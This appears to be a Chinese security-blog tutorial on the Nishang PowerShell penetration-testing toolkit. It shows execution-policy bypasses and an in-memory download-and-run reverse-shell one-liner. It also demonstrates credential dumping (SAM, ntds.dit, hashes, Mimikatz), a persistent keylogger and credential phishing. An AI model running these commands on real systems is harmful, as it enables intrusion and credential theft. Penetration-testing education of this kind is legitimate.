# 【技术分享】Powershell 渗透测试工具-Nishang（二）

## 译文声明
本文是翻译文章，原文来源：安全客。
译文仅供参考，具体内容及含义以原文为准。

**作者：** [V1ct0r](http://bobao.360.cn/member/contribute?uid=2665001095)  
**稿费：** 500 RMB（欢迎投稿！）  
**投稿方式：** 发送邮件至 linwei#360.cn 或登录 [网页版](http://bobao.360.cn/contribute/index) 在线投稿

### 传送门
[【技术分享】Powershell 渗透测试工具-Nishang（一）](http://bobao.360.cn/learning/detail/3182.html)

## 0x00 介绍
Powershell 作为一种渗透测试工具，早在多年前就被提出。它允许攻击者在不接触磁盘的情况下执行命令，并且相较于广泛受到关注和防御的 Cmd 来说，Powershell 更不容易引起注意。Nishang 是一个基于 Powershell 的渗透测试工具集，包含了框架、脚本和各种 payload，旨在帮助渗透测试人员对 Windows 目标进行全面检测。Nishang 的最新版本为 v0.67。本文将详细介绍这一实用的 Powershell 渗透测试工具。

## 0x01 使用
要使用 Nishang，首先需要从 [作者的 Github](https://github.com/samratashok/nishang) 下载该工具，然后加载这些脚本。

### 系统要求
Nishang 需要 Powershell 版本 3 及以上。以下是两种查看当前 Powershell 版本的方法：
1. 在 Powershell 中执行 `get-host` 命令。
2. 在 Powershell 中执行 `$PSVersionTable.PSVersion`。

默认情况下，不同 Server OS 对应的 Powershell 版本如下：
- Windows 2008 R2: Version 2
- Windows 2012: Version 3
- Windows 2012 R2: Version 4
- Windows 2016: Version 5

### 加载脚本
加载 Nishang 脚本：
```powershell
PS D:\nishang-master> Import-Module .\nishang.psm1
```

如果遇到问题，可能是因为 Powershell 的默认执行策略是 Restricted，不允许运行任何脚本。可以通过以下命令查看当前的执行策略：
```powershell
PS D:\nishang-master> Get-ExecutionPolicy
```

将执行策略改为 RemoteSigned，以便运行其他用户的脚本：
```powershell
PS D:\nishang-master> Set-ExecutionPolicy RemoteSigned
```
这需要在管理员权限下执行。

### 绕过执行策略
在真实攻击场景中，建议不要更改全局策略。以下是一些绕过执行策略的方法：
- `Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted`：设置当前用户的执行策略为 Unrestricted。
- `powershell.exe -executionpolicy bypass -Windowstyle hidden -noninteractive -nologo -File`：隐藏窗口并绕过执行策略。
- `PowerShell.exe -ExecutionPolicy Bypass -File`：绕过执行策略并运行文件。

更多方法可以参考 [Bypass 执行策略的十五种方法](<链接>)。

### 加载独立脚本
使用 Dot Sourcing 方式加载独立脚本：
```powershell
PS D:\nishang-master> . "D:\nishang-master\Gather\Get-Information.ps1"
```

### 获取帮助
可以使用 `Get-Help` 命令获取脚本的用法和说明：
```powershell
PS D:\nishang-master> Get-Help Get-Wlan-Keys
```

### 导出结果
使用 `Out-File` 将执行结果导出到文件中：
```powershell
PS D:\nishang-master> Get-Information | Out-File res.txt
```

### 内存加载脚本
第一种方法：
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://<URL>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
```

第二种方法，使用 `Invoke-Encode` 脚本编码压缩现有脚本：
```powershell
PS D:\nishang-master> Invoke-Encode -DataToEncode "D:\nishang-master\Shells\Invoke-PowerShellTcp.ps1" -OutCommand
Encoded data written to .encoded.txt
Encoded command written to .encodedcommand.txt
```

在目标上使用以下命令执行编码后的脚本：
```powershell
C:\Users\target> powershell -e [encodedscript]
```

## 0x02 模块介绍

### 信息搜集
- **Check-VM**
  用于检测当前机器是否为已知虚拟机。通过检测已知虚拟机指纹（如 Hyper-V, VMWare, Virtual PC, Virtual Box, Xen, QEMU）来识别。
  ```powershell
  PS > Check-VM
  ```

- **Copy-VSS**
  利用 Volume Shadow Copy 服务复制 SAM 文件。在 DC 机上还能复制 ntds.dit 和 SYSTEM hive。
  ```powershell
  PS > Copy-VSS
  PS > Copy-VSS -DestinationDir C:\temp
  ```

- **Invoke-CredentialsPhish**
  用于欺骗用户输入账号密码信息。
  ```powershell
  PS > Invoke-CredentialsPhish
  ```

- **FireBuster & FireListener**
  FireBuster 对内网进行扫描并将包发送给 FireListener。
  ```powershell
  PS > FireBuster 10.10.10.10 1000-1020
  PS > FireListener -portrange 1000-1020
  ```

- **Get-Information**
  获取目标机器上的大量信息（FTP 访问、进程、计算机配置信息等）。
  ```powershell
  PS > Get-Information
  ```

- **Get-LSASecret**
  获取 LSA 信息，通常与 `Enable-DuplicateToken` 联合使用。
  ```powershell
  PS > Enable-DuplicateToken
  PS > Get-LsaSecret
  PS > Get-LsaSecret -RegistryKey KeyName
  ```

- **Get-PassHashes**
  在 Administrator 权限下 dump 出密码哈希值。
  ```powershell
  PS > Get-PassHashes -PSObjectFormat
  ```

- **Get-WLAN-Keys**
  在 Administrator 权限下 dump 出 WLAN 文件的密钥信息。
  ```powershell
  PS > Get-WLAN-Keys
  ```

- **Keylogger**
  保存用户的键盘记录。
  ```powershell
  PS > .\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis
  PS > .\Keylogger.ps1 -persist
  ```

- **Invoke-MimikatzWdigestDowngrade**
  Dump 出 Windows 8.1 和 Server 2012 的系统用户密码。
  ```powershell
  PS > Invoke-MimikatzWDigestDowngrade
  PS > Get-Job | Receive-Job
  ```

- **Get-PassHints**
  从 Windows 获得用户的密码提示信息。
  ```powershell
  PS > Get-PassHints
  ```

- **Show-TargetScreen**
  使用 MJPEG 传输目标机器的远程桌面实时画面。
  ```powershell
  PS > Show-TargetScreen -Reverse -IPAddress 192.168.230.1 -Port 443
  ```

- **Invoke-Mimikatz**
  使用 Mimikatz 进行各种操作。
  ```powershell
  PS > Invoke-Mimikatz -DumpCerts
  PS > Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
  PS > Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
  ```

### 域相关脚本
- **Get-Unconstrained**
  查找域内开启了 Kerberos Unconstrained Delegation 的机器。
  ```powershell
  PS > Get-Unconstrained
  ```

希望这些内容对你有所帮助。如果你有任何问题或需要进一步的信息，请随时联系我们。